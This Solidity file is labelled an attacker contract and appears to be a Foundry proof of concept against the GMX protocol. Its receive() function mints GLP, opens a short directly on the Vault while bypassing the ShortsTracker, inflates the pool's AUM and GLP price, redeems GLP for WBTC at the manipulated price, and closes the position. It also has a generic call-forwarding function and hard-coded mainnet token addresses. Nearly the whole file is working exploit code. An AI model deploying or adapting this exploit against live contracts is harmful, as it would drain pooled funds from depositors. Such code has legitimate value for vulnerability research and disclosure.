// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// attacker contract

import "../src/GMXInterface.sol";
import "../src/GMXInterfacesExtended.sol";
// import {GlpManager} from "gmx-contracts/core/GlpManager.sol";
// import {Vault} from "gmx-contracts/core/Vault.sol";
// import {GLP} from "gmx-contracts/gmx/GLP.sol";
// import {RewardRouterV2} from "gmx-contracts/staking/RewardRouterV2.sol";
// import {IERC20} from "gmx-contracts/libraries/token/IERC20.sol";

import {console} from "forge-std/console.sol";

contract SimpleAttacker {
    IGlpManager public glpManager;
    IVault public vault;
    IGLP public glp;
    IRewardRouterV2 public rewardRouter;

    address public wbtc = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address public usdc = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;

    uint256 public position_size_delta;

    event ManipulatedAum(uint256 aum);
    event ManipulatedGLPPrice(uint256 price);

    constructor(address _glpManager, address _vault, address _glp, address _rewardRouter) public {
        glpManager = IGlpManager(_glpManager);
        vault = IVault(_vault);
        glp = IGLP(_glp);
        rewardRouter = IRewardRouterV2(payable(_rewardRouter));
    }


    function set_size_delta(uint256 _size_delta) public {
        position_size_delta = _size_delta;
    }

    receive() external payable {

        uint256 minting_amount = 1_000_000 * 10**6;

        IERC20(usdc).approve(address(glpManager), minting_amount);

        uint256 glp_amount = rewardRouter.mintAndStakeGlp(
            usdc,
            minting_amount,
            0,
            0
        );

        console.log("previous aum: ", glpManager.getAum(false));
        console.log("previous glp price: ", glpManager.getPrice(true));

        IERC20(usdc).transfer(address(vault), IERC20(usdc).balanceOf(address(this)));

        console.log("increase position with bypassing ShortsTracker");
        vault.increasePosition(
            address(this),
            usdc,
            wbtc,
            position_size_delta,
            false // isLong
        );

        console.log("manipulated aum:", glpManager.getAum(false));
        console.log("manipulated glp price: ", glpManager.getPrice(true));


        emit ManipulatedAum(glpManager.getAum(false));

        emit ManipulatedGLPPrice(glpManager.getPrice(true));

        {
            // calculation for unstake glp amount
            uint256 aum_in_usdg = glpManager.getAumInUsdg(false);
            uint256 glp_supply = glp.totalSupply();

            uint256 reserved_amount = vault.reservedAmounts(wbtc);
            uint256 pool_amount = vault.poolAmounts(wbtc);
            uint256 pull_amount = pool_amount - reserved_amount;

            // 18 is usdg decimals, 8 is wbtc decimals
            uint256 usdg_amount = (pull_amount * vault.getMinPrice(wbtc)) / 10 ** (30 - (18 - 8));
            console.log("usdg_amount", usdg_amount);
            uint256 wbtc_glp_amount = (usdg_amount * glp_supply) / aum_in_usdg;
            rewardRouter.unstakeAndRedeemGlp(
                wbtc,
                wbtc_glp_amount,
                0,
                address(this)
            );
        }

        vault.decreasePosition(
            address(this),
            usdc,
            wbtc,
            0, // collateralDelta
            position_size_delta,
            false,
            address(this)
        );
    }

    function execute(bytes calldata data, address target) external payable {
        (bool success, ) = target.call{value: msg.value}(data);
        require(success, "Failed to execute");
    }

}